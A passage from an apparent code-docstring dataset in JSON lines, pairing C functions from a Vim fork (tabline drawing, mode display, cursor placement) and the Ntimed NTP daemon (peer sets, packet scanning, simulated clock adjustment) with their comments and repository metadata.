FALSE;\n\twin_redr_custom(NULL, FALSE);\n\tif (called_emsg)\n\t    set_string_option_direct((char_u *)\"tabline\", -1,\n\t\t\t\t\t   (char_u *)\"\", OPT_FREE, SID_ERROR);\n\tcalled_emsg |= save_called_emsg;\n    }\n    else\n#endif\n    {\n\tfor (tp = first_tabpage; tp != NULL; tp = tp->tp_next)\n\t    ++tabcount;\n\n\ttabwidth = (Columns - 1 + tabcount / 2) / tabcount;\n\tif (tabwidth < 6)\n\t    tabwidth = 6;\n\n\tattr = attr_nosel;\n\ttabcount = 0;\n\tscol = 0;\n\tfor (tp = first_tabpage; tp != NULL && col < Columns - 4;\n\t\t\t\t\t\t\t     tp = tp->tp_next)\n\t{\n\t    scol = col;\n\n\t    if (tp->tp_topframe == topframe)\n\t\tattr = attr_sel;\n\t    if (use_sep_chars && col > 0)\n\t\tscreen_putchar('|', 0, col++, attr);\n\n\t    if (tp->tp_topframe != topframe)\n\t\tattr = attr_nosel;\n\n\t    screen_putchar(' ', 0, col++, attr);\n\n\t    if (tp == curtab)\n\t    {\n\t\tcwp = curwin;\n\t\twp = firstwin;\n\t    }\n\t    else\n\t    {\n\t\tcwp = tp->tp_curwin;\n\t\twp = tp->tp_firstwin;\n\t    }\n\n\t    modified = FALSE;\n\t    for (wincount = 0; wp != NULL; wp = wp->w_next, ++wincount)\n\t\tif (bufIsChanged(wp->w_buffer))\n\t\t    modified = TRUE;\n\t    if (modified || wincount > 1)\n\t    {\n\t\tif (wincount > 1)\n\t\t{\n\t\t    vim_snprintf((char *)NameBuff, MAXPATHL, \"%d\", wincount);\n\t\t    len = (int)STRLEN(NameBuff);\n\t\t    if (col + len >= Columns - 3)\n\t\t\tbreak;\n\t\t    screen_puts_len(NameBuff, len, 0, col,\n#if defined(FEAT_SYN_HL)\n\t\t\t\t\t hl_combine_attr(attr, hl_attr(HLF_T))\n#else\n\t\t\t\t\t attr\n#endif\n\t\t\t\t\t       );\n\t\t    col += len;\n\t\t}\n\t\tif (modified)\n\t\t    screen_puts_len((char_u *)\"+\", 1, 0, col++, attr);\n\t\tscreen_putchar(' ', 0, col++, attr);\n\t    }\n\n\t    room = scol - col + tabwidth - 1;\n\t    if (room > 0)\n\t    {\n\t\t/* Get buffer name in NameBuff[] */\n\t\tget_trans_bufname(cwp->w_buffer);\n\t\tshorten_dir(NameBuff);\n\t\tlen = vim_strsize(NameBuff);\n\t\tp = NameBuff;\n#ifdef FEAT_MBYTE\n\t\tif (has_mbyte)\n\t\t    while (len > room)\n\t\t    {\n\t\t\tlen -= ptr2cells(p);\n\t\t\tmb_ptr_adv(p);\n\t\t    }\n\t\telse\n#endif\n\t\t    if (len > room)\n\t\t{\n\t\t    p += len - room;\n\t\t    len = room;\n\t\t}\n\t\tif (len > Columns - col - 1)\n\t\t    len = Columns - col - 1;\n\n\t\tscreen_puts_len(p, (int)STRLEN(p), 0, col, attr);\n\t\tcol += len;\n\t    }\n\t    screen_putchar(' ', 0, col++, attr);\n\n\t    /* Store the tab page number in TabPageIdxs[], so that\n\t     * jump_to_mouse() knows where each one is. */\n\t    ++tabcount;\n\t    while (scol < col)\n\t\tTabPageIdxs[scol++] = tabcount;\n\t}\n\n\tif (use_sep_chars)\n\t    c = '_';\n\telse\n\t    c = ' ';\n\tscreen_fill(0, 1, col, (int)Columns, c, c, attr_fill);\n\n\t/* Put an \"X\" for closing the current tab if there are several. */\n\tif (first_tabpage->tp_next != NULL)\n\t{\n\t    screen_putchar('X', 0, (int)Columns - 1, attr_nosel);\n\t    TabPageIdxs[Columns - 1] = -999;\n\t}\n    }\n\n    /* Reset the flag here again, in case evaluating 'tabline' causes it to be\n     * set. */\n    redraw_tabline = FALSE;\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * show the current mode and ruler\n *\n * If clear_cmdline is TRUE, clear the rest of the cmdline.\n * If clear_cmdline is FALSE there may be a message there that needs to be\n * cleared only if a mode is shown.\n * Return the length of the message (0 if no message).\n */\n", "func_signal": "int\nshowmode()", "code": "{\n    int\t\tneed_clear;\n    int\t\tlength = 0;\n    int\t\tdo_mode;\n    int\t\tattr;\n    int\t\tnwr_save;\n#ifdef FEAT_INS_EXPAND\n    int\t\tsub_attr;\n#endif\n\n    do_mode = ((p_smd && msg_silent == 0)\n\t    && ((State & INSERT)\n\t\t|| restart_edit\n\t\t|| VIsual_active));\n    if (do_mode || Recording)\n    {\n\t/*\n\t * Don't show mode right now, when not redrawing or inside a mapping.\n\t * Call char_avail() only when we are going to show something, because\n\t * it takes a bit of time.\n\t */\n\tif (!redrawing() || (char_avail() && !KeyTyped) || msg_silent != 0)\n\t{\n\t    redraw_cmdline = TRUE;\t\t/* show mode later */\n\t    return 0;\n\t}\n\n\tnwr_save = need_wait_return;\n\n\t/* wait a bit before overwriting an important message */\n\tcheck_for_delay(FALSE);\n\n\t/* if the cmdline is more than one line high, erase top lines */\n\tneed_clear = clear_cmdline;\n\tif (clear_cmdline && cmdline_row < Rows - 1)\n\t    msg_clr_cmdline();\t\t\t/* will reset clear_cmdline */\n\n\t/* Position on the last line in the window, column 0 */\n\tmsg_pos_mode();\n\tcursor_off();\n\tattr = hl_attr(HLF_CM);\t\t\t/* Highlight mode */\n\tif (do_mode)\n\t{\n\t    MSG_PUTS_ATTR(\"--\", attr);\n#if defined(FEAT_XIM)\n\t    if (\n# ifdef FEAT_GUI_GTK\n\t\t    preedit_get_status()\n# else\n\t\t    im_get_status()\n# endif\n\t       )\n# ifdef FEAT_GUI_GTK /* most of the time, it's not XIM being used */\n\t\tMSG_PUTS_ATTR(\" IM\", attr);\n# else\n\t\tMSG_PUTS_ATTR(\" XIM\", attr);\n# endif\n#endif\n#if defined(FEAT_HANGULIN) && defined(FEAT_GUI)\n\t    if (gui.in_use)\n\t    {\n\t\tif (hangul_input_state_get())\n\t\t    MSG_PUTS_ATTR(\" \\307\\321\\261\\333\", attr);   /* HANGUL */\n\t    }\n#endif\n#ifdef FEAT_INS_EXPAND\n\t    /* CTRL-X in Insert mode */\n\t    if (edit_submode != NULL && !shortmess(SHM_COMPLETIONMENU))\n\t    {\n\t\t/* These messages can get long, avoid a wrap in a narrow\n\t\t * window.  Prefer showing edit_submode_extra. */\n\t\tlength = (Rows - msg_row) * Columns - 3;\n\t\tif (edit_submode_extra != NULL)\n\t\t    length -= vim_strsize(edit_submode_extra);\n\t\tif (length > 0)\n\t\t{\n\t\t    if (edit_submode_pre != NULL)\n\t\t\tlength -= vim_strsize(edit_submode_pre);\n\t\t    if (length - vim_strsize(edit_submode) > 0)\n\t\t    {\n\t\t\tif (edit_submode_pre != NULL)\n\t\t\t    msg_puts_attr(edit_submode_pre, attr);\n\t\t\tmsg_puts_attr(edit_submode, attr);\n\t\t    }\n\t\t    if (edit_submode_extra != NULL)\n\t\t    {\n\t\t\tMSG_PUTS_ATTR(\" \", attr);  /* add a space in between */\n\t\t\tif ((int)edit_submode_highl < (int)HLF_COUNT)\n\t\t\t    sub_attr = hl_attr(edit_submode_highl);\n\t\t\telse\n\t\t\t    sub_attr = attr;\n\t\t\tmsg_puts_attr(edit_submode_extra, sub_attr);\n\t\t    }\n\t\t}\n\t\tlength = 0;\n\t    }\n\t    else\n#endif\n\t    {\n#ifdef FEAT_VREPLACE\n\t\tif (State & VREPLACE_FLAG)\n\t\t    MSG_PUTS_ATTR(_(\" VREPLACE\"), attr);\n\t\telse\n#endif\n\t\t    if (State & REPLACE_FLAG)\n\t\t    MSG_PUTS_ATTR(_(\" REPLACE\"), attr);\n\t\telse if (State & INSERT)\n\t\t{\n#ifdef FEAT_RIGHTLEFT\n\t\t    if (p_ri)\n\t\t\tMSG_PUTS_ATTR(_(\" REVERSE\"), attr);\n#endif\n\t\t    MSG_PUTS_ATTR(_(\" INSERT\"), attr);\n\t\t}\n\t\telse if (restart_edit == 'I')\n\t\t    MSG_PUTS_ATTR(_(\" (insert)\"), attr);\n\t\telse if (restart_edit == 'R')\n\t\t    MSG_PUTS_ATTR(_(\" (replace)\"), attr);\n\t\telse if (restart_edit == 'V')\n\t\t    MSG_PUTS_ATTR(_(\" (vreplace)\"), attr);\n#ifdef FEAT_RIGHTLEFT\n\t\tif (p_hkmap)\n\t\t    MSG_PUTS_ATTR(_(\" Hebrew\"), attr);\n# ifdef FEAT_FKMAP\n\t\tif (p_fkmap)\n\t\t    MSG_PUTS_ATTR(farsi_text_5, attr);\n# endif\n#endif\n#ifdef FEAT_KEYMAP\n\t\tif (State & LANGMAP)\n\t\t{\n# ifdef FEAT_ARABIC\n\t\t    if (curwin->w_p_arab)\n\t\t\tMSG_PUTS_ATTR(_(\" Arabic\"), attr);\n\t\t    else\n# endif\n\t\t\tMSG_PUTS_ATTR(_(\" (lang)\"), attr);\n\t\t}\n#endif\n\t\tif ((State & INSERT) && p_paste)\n\t\t    MSG_PUTS_ATTR(_(\" (paste)\"), attr);\n\n\t\tif (VIsual_active)\n\t\t{\n\t\t    char *p;\n\n\t\t    /* Don't concatenate separate words to avoid translation\n\t\t     * problems. */\n\t\t    switch ((VIsual_select ? 4 : 0)\n\t\t\t    + (VIsual_mode == Ctrl_V) * 2\n\t\t\t    + (VIsual_mode == 'V'))\n\t\t    {\n\t\t\tcase 0:\tp = N_(\" VISUAL\"); break;\n\t\t\tcase 1: p = N_(\" VISUAL LINE\"); break;\n\t\t\tcase 2: p = N_(\" VISUAL BLOCK\"); break;\n\t\t\tcase 4: p = N_(\" SELECT\"); break;\n\t\t\tcase 5: p = N_(\" SELECT LINE\"); break;\n\t\t\tdefault: p = N_(\" SELECT BLOCK\"); break;\n\t\t    }\n\t\t    MSG_PUTS_ATTR(_(p), attr);\n\t\t}\n\t\tMSG_PUTS_ATTR(\" --\", attr);\n\t    }\n\n\t    need_clear = TRUE;\n\t}\n\tif (Recording\n#ifdef FEAT_INS_EXPAND\n\t\t&& edit_submode == NULL\t    /* otherwise it gets too long */\n#endif\n\t\t)\n\t{\n\t    MSG_PUTS_ATTR(_(\"recording\"), attr);\n\t    need_clear = TRUE;\n\t}\n\n\tmode_displayed = TRUE;\n\tif (need_clear || clear_cmdline)\n\t    msg_clr_eos();\n\tmsg_didout = FALSE;\t\t/* overwrite this message */\n\tlength = msg_col;\n\tmsg_col = 0;\n\tneed_wait_return = nwr_save;\t/* never ask for hit-return for this */\n    }\n    else if (clear_cmdline && msg_silent == 0)\n\t/* Clear the whole command line.  Will reset \"clear_cmdline\". */\n\tmsg_clr_cmdline();\n\n#ifdef FEAT_CMDL_INFO\n    /* In Visual mode the size of the selected area must be redrawn. */\n    if (VIsual_active)\n\tclear_showcmd();\n\n    /* If the last window has no status line, the ruler is after the mode\n     * message and must be redrawn */\n    if (redrawing()\n# ifdef FEAT_WINDOWS\n\t    && lastwin->w_status_height == 0\n# endif\n       )\n\twin_redr_ruler(lastwin, TRUE);\n#endif\n    redraw_cmdline = FALSE;\n    clear_cmdline = FALSE;\n\n    return length;\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * return process ID\n */\n", "func_signal": "long\nmch_get_pid()", "code": "{\n#ifdef __amigaos4__\n    /* This is as close to a pid as we can come. We could use CLI numbers also,\n     * but then we would have two different types of process identifiers.\n     */\n    return((long)FindTask(0));\n#else\n    return (long)0;\n#endif\n}", "path": "src\\os_amiga.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Undisplay the popup menu (later).\n */\n", "func_signal": "void\npum_undisplay()", "code": "{\n    pum_array = NULL;\n    redraw_all_later(SOME_VALID);\n#ifdef FEAT_WINDOWS\n    redraw_tabline = TRUE;\n#endif\n    status_redraw_all();\n}", "path": "src\\popupmnu.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Redraw all status lines that need to be redrawn.\n */\n", "func_signal": "void\nredraw_statuslines()", "code": "{\n    win_T\t*wp;\n\n    for (wp = firstwin; wp; wp = wp->w_next)\n\tif (wp->w_redr_status)\n\t    win_redr_status(wp);\n    if (redraw_tabline)\n\tdraw_tabline();\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Force a complete redraw later.  Also resets the highlighting.  To be used\n * after executing a shell command that messes up the screen.\n */\n", "func_signal": "void\nredraw_later_clear()", "code": "{\n    redraw_all_later(CLEAR);\n#ifdef FEAT_GUI\n    if (gui.in_use)\n\t/* Use a code that will reset gui.highlight_mask in\n\t * gui_stop_highlight(). */\n\tscreen_attr = HL_ALL + 1;\n    else\n#endif\n\t/* Use attributes that is very unlikely to appear in text. */\n\tscreen_attr = HL_BOLD | HL_UNDERLINE | HL_INVERSE;\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/*\n * Set cursor to its position in the current window.\n */\n", "func_signal": "void\nsetcursor()", "code": "{\n    if (redrawing())\n    {\n\tvalidate_cursor();\n\twindgoto(W_WINROW(curwin) + curwin->w_wrow,\n\t\tW_WINCOL(curwin) + (\n#ifdef FEAT_RIGHTLEFT\n\t\t/* With 'rightleft' set and the cursor on a double-wide\n\t\t * character, position it on the leftmost column. */\n\t\tcurwin->w_p_rl ? ((int)W_WIDTH(curwin) - curwin->w_wcol - (\n# ifdef FEAT_MBYTE\n\t\t\t(has_mbyte\n\t\t\t   && (*mb_ptr2cells)(ml_get_cursor()) == 2\n\t\t\t   && vim_isprintc(gchar_cursor())) ? 2 :\n# endif\n\t\t\t1)) :\n#endif\n\t\t\t\t\t\t\t    curwin->w_wcol));\n    }\n}", "path": "src\\screen.c", "repo_name": "b4winckler/vim", "stars": 257, "license": "None", "language": "c", "size": 322063}
{"docstring": "/**********************************************************************/\n", "func_signal": "static int\nntp_peerset_fillgroup(struct ocx *ocx, struct ntp_peerset *nps,\n    struct ntp_group *ng, const char *lookup)", "code": "{\n\tstruct addrinfo hints, *res, *res0;\n\tint error, n = 0;\n\tstruct ntp_peer *np, *np2;\n\n\tCHECK_OBJ_NOTNULL(nps, NTP_PEERSET_MAGIC);\n\tCHECK_OBJ_NOTNULL(ng, NTP_GROUP_MAGIC);\n\n\tmemset(&hints, 0, sizeof hints);\n\thints.ai_family = PF_UNSPEC;\n\thints.ai_socktype = SOCK_DGRAM;\n\terror = getaddrinfo(lookup, \"ntp\", &hints, &res0);\n\tif (error)\n\t\tFail(ocx, 1, \"hostname '%s', port 'ntp': %s\\n\",\n\t\t    lookup, gai_strerror(error));\n\tfor (res = res0; res; res = res->ai_next) {\n\t\tif (res->ai_family != AF_INET && res->ai_family != AF_INET6)\n\t\t\tcontinue;\n\t\tnp = NTP_Peer_New(ng->hostname, res->ai_addr, res->ai_addrlen);\n\t\tAN(np);\n\t\tTAILQ_FOREACH(np2, &nps->head, list)\n\t\t\tif (SA_Equal(np->sa, np->sa_len, np2->sa, np2->sa_len))\n\t\t\t\tbreak;\n\t\tif (np2 != NULL) {\n\t\t\t/* All duplicates point to the same \"master\" */\n\t\t\tnp->state = NTP_STATE_DUPLICATE;\n\t\t\tnp->other = np2->other;\n\t\t\tif (np->other == NULL)\n\t\t\t\tnp->other = np2;\n\t\t\tTAILQ_INSERT_TAIL(&nps->head, np, list);\n\t\t\tDebug(ocx, \"Peer {%s %s} is duplicate of {%s %s}\\n\",\n\t\t\t    np->hostname, np->ip, np2->hostname, np2->ip);\n\t\t} else {\n\t\t\tnp->state = NTP_STATE_NEW;\n\t\t\tTAILQ_INSERT_HEAD(&nps->head, np, list);\n\t\t}\n\t\tnps->npeer++;\n\t\tnp->group = ng;\n\t\tng->npeer++;\n\t\tn++;\n\t}\n\tfreeaddrinfo(res0);\n\treturn (n);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Non-tweaking subset.\n */\n", "func_signal": "void\nTime_Unix_Passive(void)", "code": "{\n\n\tTB_Sleep = kt_sleep;\n\tTB_Now = kt_now;\n}", "path": "time_unix.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "void\nTime_Sim(struct todolist *tdl)", "code": "{\n\n\tINIT_OBJ(&st_now, TIMESTAMP_MAGIC);\n\tTS_Add(&st_now, 1e6);\n\tTB_Now = st_Now;\n\tTB_Sleep = st_Sleep;\n\tTB_Step = st_Step;\n\tTB_Adjust = st_Adjust;\n\t(void)TODO_ScheduleRel(tdl, st_kern_pll, NULL, 0.0, 1.0, \"SIMPLL\");\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Create a new group and add whatever peers its hostname resolves to\n */\n", "func_signal": "int\nNTP_PeerSet_Add(struct ocx *ocx, struct ntp_peerset *nps, const char *hostname)", "code": "{\n\tstruct ntp_group *ng;\n\n\tCHECK_OBJ_NOTNULL(nps, NTP_PEERSET_MAGIC);\n\n\tTAILQ_FOREACH(ng, &nps->group, list)\n\t\tif (!strcasecmp(ng->hostname, hostname))\n\t\t\tFail(ocx, 0, \"hostname %s is duplicated\\n\", hostname);\n\n\tng = ntp_peerset_add_group(nps, hostname);\n\n\tif (ntp_peerset_fillgroup(ocx, nps, ng, hostname) == 0)\n\t\tFail(ocx, 0, \"hostname %s no IP# found.\\n\", hostname);\n\n\treturn (ng->npeer);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "void\nTime_Unix(struct todolist *tdl)", "code": "{\n\n\tAN(tdl);\n\tTB_Step = kt_step;\n\tTB_Adjust = kt_adjust;\n\tTB_Sleep = kt_sleep;\n\tTB_Now = kt_now;\n\tkt_tdl = tdl;\n\n\t/* XXX: test if we have perms */\n}", "path": "time_unix.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static struct ntp_group *\nntp_peerset_add_group(struct ntp_peerset *nps, const char *name)", "code": "{\n\tstruct ntp_group *ng;\n\n\tALLOC_OBJ(ng, NTP_GROUP_MAGIC);\n\tAN(ng);\n\tng->hostname = strdup(name);\n\tAN(ng->hostname);\n\tTAILQ_INSERT_TAIL(&nps->group, ng, list);\n\tnps->ngroup++;\n\treturn (ng);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Scan a packet in NTP_Tool_Format layout.\n */\n", "func_signal": "int\nNTP_Tool_Scan(struct ntp_packet *pkt, const char *buf)", "code": "{\n\tunsigned u_fields[8];\n\tdouble d_fields[7];\n\tchar cc;\n\tint i;\n\n\ti = sscanf(buf,\n\t    \"[%u %u %u %u %u %lf %lf %lf %x %lf %u.%u %lf %lf %lf%c\",\n\t    u_fields + 0,\t/* NTP_leap */\n\t    u_fields + 1,\t/* NTP_version */\n\t    u_fields + 2,\t/* NTP_mode */\n\t    u_fields + 3,\t/* NTP_stratum */\n\t    u_fields + 4,\t/* NTP_poll */\n\t    d_fields + 0,\t/* NTP_precision */\n\t    d_fields + 1,\t/* NTP_delay */\n\t    d_fields + 2,\t/* NTP_dispersion */\n\t    u_fields + 5,\t/* NTP_refid */\n\t    d_fields + 3,\t/* NTP_reference - NTP_origin */\n\t    u_fields + 6,\t/* NTP_origin:sec */\n\t    u_fields + 7,\t/* NTP_origin:nsec */\n\t    d_fields + 4,\t/* NTP_receive - NTP_origin */\n\t    d_fields + 5,\t/* NTP_transmit - NTP_receive */\n\t    d_fields + 6,\t/* ts_rx - NTP_transmit*/\n\t    &cc);\n\tif (i != 16 || cc != ']')\n\t\treturn (-1);\n\n\tINIT_OBJ(pkt, NTP_PACKET_MAGIC);\n\tpkt->ntp_leap = (enum ntp_leap)u_fields[0];\n\tpkt->ntp_version = (uint8_t)u_fields[1];\n\tpkt->ntp_mode = (enum ntp_mode)u_fields[2];\n\tpkt->ntp_stratum = (uint8_t)u_fields[3];\n\tpkt->ntp_poll = (uint8_t)u_fields[4];\n\tpkt->ntp_precision = (int8_t)floor(d_fields[0]);\n\tTS_Double(&pkt->ntp_delay, d_fields[1]);\n\tTS_Double(&pkt->ntp_dispersion, d_fields[2]);\n\tBe32enc(pkt->ntp_refid, u_fields[5]);\n\n\tTS_Nanosec(&pkt->ntp_origin, u_fields[6], u_fields[7]);\n\n\tpkt->ntp_reference = pkt->ntp_origin;\n\tTS_Add(&pkt->ntp_reference, d_fields[3]);\n\n\tpkt->ntp_receive = pkt->ntp_origin;\n\tTS_Add(&pkt->ntp_receive, d_fields[4]);\n\n\tpkt->ntp_transmit = pkt->ntp_receive;\n\tTS_Add(&pkt->ntp_transmit, d_fields[5]);\n\n\tif (d_fields[6] != 0.0) {\n\t\tpkt->ts_rx = pkt->ntp_transmit;\n\t\tTS_Add(&pkt->ts_rx, d_fields[6]);\n\t} else\n\t\tINIT_OBJ(&pkt->ts_rx, TIMESTAMP_MAGIC);\n\treturn (0);\n}", "path": "ntp_tools.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static void __match_proto__(tb_adjust_f)\nst_Adjust(struct ocx *ocx, double offset, double duration, double frequency)", "code": "{\n\n\t(void)ocx;\n\tadj_offset = offset;\n\tadj_duration = floor(duration);\n\tif (adj_offset > 0.0 && adj_duration == 0.0)\n\t\tadj_duration = 1.0;\n\tadj_freq = frequency;\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Iterator helpers\n */\n", "func_signal": "struct ntp_peer *\nNTP_PeerSet_Iter0(const struct ntp_peerset *nps)", "code": "{\n\n\tCHECK_OBJ_NOTNULL(nps, NTP_PEERSET_MAGIC);\n\treturn (TAILQ_FIRST(&nps->head));\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * This function is responsible for polling the peers in the set.\n */\n", "func_signal": "static enum todo_e __match_proto__(todo_f)\nntp_peerset_poll(struct ocx *ocx, struct todolist *tdl, void *priv)", "code": "{\n\tstruct ntp_peerset *nps;\n\tstruct ntp_peer *np;\n\tdouble d, dt;\n\n\t(void)ocx;\n\tCAST_OBJ_NOTNULL(nps, priv, NTP_PEERSET_MAGIC);\n\tAN(tdl);\n\n\tnp = TAILQ_FIRST(&nps->head);\n\tif (np == NULL)\n\t\treturn(TODO_DONE);\n\n\tCHECK_OBJ_NOTNULL(np, NTP_PEER_MAGIC);\n\tTAILQ_REMOVE(&nps->head, np, list);\n\tTAILQ_INSERT_TAIL(&nps->head, np, list);\n\n\td = nps->poll_period / nps->npeer;\n\tif (nps->t0 < nps->init_duration) {\n\t\tdt = exp(\n\t\t    log(nps->init_duration) / (nps->init_packets * nps->npeer));\n\t\tif (nps->t0 * dt < nps->init_duration)\n\t\t\td = nps->t0 * dt - nps->t0;\n\t}\n\tnps->t0 += d;\n\tTODO_ScheduleRel(tdl, ntp_peerset_poll, nps, d, 0.0, \"NTP_PeerSet\");\n\tif (NTP_Peer_Poll(ocx, nps->usc, np, 0.8)) {\n\t\tif (np->filter_func != NULL)\n\t\t\tnp->filter_func(ocx, np);\n\t}\n\n\treturn (TODO_OK);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static void __match_proto__(tb_step_f)\nst_Step(struct ocx *ocx, double offset)", "code": "{\n\n\tDebug(ocx, \"SIMSTEP %.3e\\n\", offset);\n\tTime_Sim_delta += offset;\n\tTB_generation++;\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "struct ntp_peerset *\nNTP_PeerSet_New(struct ocx *ocx)", "code": "{\n\tstruct ntp_peerset *nps;\n\n\t(void)ocx;\n\tALLOC_OBJ(nps, NTP_PEERSET_MAGIC);\n\tAN(nps);\n\n\tTAILQ_INIT(&nps->head);\n\tTAILQ_INIT(&nps->group);\n\treturn (nps);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Format a NTP packet in a standardized layout for subsequent parsing.\n *\n * We dump absolute timestamps relative to the origin timestamp.\n *\n * XXX: Nanosecond precision is enough for everybody.\n */\n", "func_signal": "static void __printflike(3, 4)\nbxprintf(char **bp, const char *e, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\n\tassert(*bp < e);\n\tva_start(ap, fmt);\n\t*bp += vsnprintf(*bp, (unsigned)(e - *bp), fmt, ap);\n\tva_end(ap);\n}", "path": "ntp_tools.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static enum todo_e __match_proto__(todo_f)\nst_kern_pll(struct ocx *ocx, struct todolist *tdl, void *priv)", "code": "{\n\tdouble d;\n\n\t(void)ocx;\n\tAN(tdl);\n\tAZ(priv);\n\tfreq = freq0 + adj_freq;\n\tif (adj_duration > 0.0) {\n\t\td = adj_offset / adj_duration;\n\t\tfreq += d;\n\t\tadj_offset -= d;\n\t\tadj_duration -= 1.0;\n\t}\n\tPut(ocx, OCX_TRACE, \"SIMPLL %.3e %.3e %.3e\\n\",\n\t    adj_freq, adj_offset, adj_duration);\n\treturn (TODO_OK);\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Add a peer with a specific hostname+ip combination without actually\n * resolving the hostname.\n */\n", "func_signal": "void\nNTP_PeerSet_AddSim(struct ocx *ocx, struct ntp_peerset *nps,\n    const char *hostname, const char *ip)", "code": "{\n\tstruct ntp_group *ng;\n\n\tCHECK_OBJ_NOTNULL(nps, NTP_PEERSET_MAGIC);\n\tTAILQ_FOREACH(ng, &nps->group, list)\n\t\tif (!strcasecmp(ng->hostname, hostname))\n\t\t\tbreak;\n\tif (ng == NULL)\n\t\tng = ntp_peerset_add_group(nps, hostname);\n\tassert(ntp_peerset_fillgroup(ocx, nps, ng, ip) == 1);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static struct timestamp *\nst_Now(struct timestamp *storage)", "code": "{\n\tif (storage == NULL)\n\t\tALLOC_OBJ(storage, TIMESTAMP_MAGIC);\n\tAN(storage);\n\t*storage = st_now;\n\treturn (storage);\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static int __match_proto__(tb_sleep_f)\nkt_sleep(double dur)", "code": "{\n\tstruct pollfd fds[1];\n\tint i;\n\n\ti = poll(fds, 0, (int)floor(dur * 1e3));\n\tif (i < 0 && errno == EINTR)\n\t\treturn (1);\n\tAZ(i);\n\treturn (0);\n}", "path": "time_unix.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * Build a standard client query packet\n */\n", "func_signal": "void\nNTP_Tool_Client_Req(struct ntp_packet *np)", "code": "{\n\tAN(np);\n\tINIT_OBJ(np, NTP_PACKET_MAGIC);\n\n\tnp->ntp_leap = NTP_LEAP_UNKNOWN;\n\tnp->ntp_version = 4;\n\tnp->ntp_mode = NTP_MODE_CLIENT;\n\tnp->ntp_stratum = 0;\n\tnp->ntp_poll = 4;\n\tnp->ntp_precision = -6;\n\tINIT_OBJ(&np->ntp_delay, TIMESTAMP_MAGIC);\n\tnp->ntp_delay.sec = 1;\n\tINIT_OBJ(&np->ntp_dispersion, TIMESTAMP_MAGIC);\n\tnp->ntp_dispersion.sec = 1;\n\tINIT_OBJ(&np->ntp_reference, TIMESTAMP_MAGIC);\n\tINIT_OBJ(&np->ntp_origin, TIMESTAMP_MAGIC);\n\tINIT_OBJ(&np->ntp_receive, TIMESTAMP_MAGIC);\n}", "path": "ntp_tools.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************/\n", "func_signal": "static int\nst_Sleep(double dur)", "code": "{\n\n\tTS_Add(&st_now, dur);\n\tTime_Sim_delta += dur * freq;\n\treturn (0);\n}", "path": "time_sim.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
{"docstring": "/**********************************************************************\n * This function will be responsible for maintaining the peers in the set\n *\n * XXX: Pick only the best N (3?) servers from any hostname as active.\n * XXX: Re-lookup hostnames on periodic basis to keep the set current\n * XXX: Implement (a future) pool.ntp.org load-balancing protocol\n */\n", "func_signal": "static enum todo_e\nntp_peerset_herd(struct ocx *ocx, struct todolist *tdl, void *priv)", "code": "{\n\t(void)ocx;\n\t(void)tdl;\n\t(void)priv;\n\treturn (TODO_DONE);\n}", "path": "ntp_peerset.c", "repo_name": "bsdphk/Ntimed", "stars": 384, "license": "None", "language": "c", "size": 532}
